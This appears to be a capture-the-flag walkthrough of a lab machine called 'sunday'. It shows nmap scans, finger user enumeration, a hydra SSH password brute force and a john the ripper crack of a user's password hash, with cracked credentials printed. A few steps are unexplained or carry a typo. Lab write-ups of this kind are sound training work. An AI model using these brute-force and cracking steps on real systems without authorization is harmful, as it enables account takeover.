### Recon

Initiating reconnaissance on sunday:
```
nmap -sC -sV 10.10.10.76
```

Results:
```
Nmap scan report for 10.10.10.76
Host is up, received user-set (0.21s latency).
Scanned at 2024-06-21 10:48:03 -03 for 1498s
Not shown: 917 closed tcp ports (reset), 80 filtered tcp ports (no-response)
PORT    STATE SERVICE REASON         VERSION
79/tcp  open  finger? syn-ack ttl 59
| fingerprint-strings:
|   GenericLines:
|     No one logged on
|   GetRequest:
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions:
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help:
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest:
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie:
|_    Login Name TTY Idle When Where
111/tcp open  rpcbind syn-ack ttl 63
515/tcp open  printer syn-ack ttl 59
```

Let's run a full port scan:
```
Nmap scan report for 10.10.10.76
Host is up (0.039s latency).
Not shown: 63933 filtered ports, 1598 closed ports
PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
22022/tcp open  unknown
55029/tcp open  unknown
```

Let's identify which services are running on the open ports:
```
nmap -p 79,111,22022,55029 -sV -oA full-scripts 10.10.10.7
```

We get back the following results:
```
Nmap scan report for 10.10.10.76
Host is up (0.037s latency).PORT      STATE SERVICE VERSION
79/tcp    open  finger  Sun Solaris fingerd
|_finger: ERROR: Script execution failed (use -d to debug)
111/tcp   open  rpcbind
22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
55029/tcp open  unknown
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunosService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.37 seconds
```

### Enumeration

```
finger root@10.10.10.76
Login       Name               TTY         Idle    When    Where
root     Super-User            ssh          <Dec  7, 2023> 10.10.14.46
```

# Initial foothold

```
hydra -l sunny -P '/usr/share/wordlists/rockyou.txt' 10.10.10.76 ssh -s 22022
```

Results:
```
[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
```

SSH into machine:
```
ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha256 -p 22022 sunny@10.10.10.76
```


```
john --wordlist=/usr/share/wordlists/rockyou.txt sammy-hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:18 0.95% (ETA: 15:13:37) 0g/s 8743p/s 8743c/s 8743C/s greena..biodome
cooldude!        (sammy)
1g 0:00:00:24 DONE (2024-06-21 14:42) 0.04003g/s 8198p/s 8198c/s 8198C/s domonique1..bluenote
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

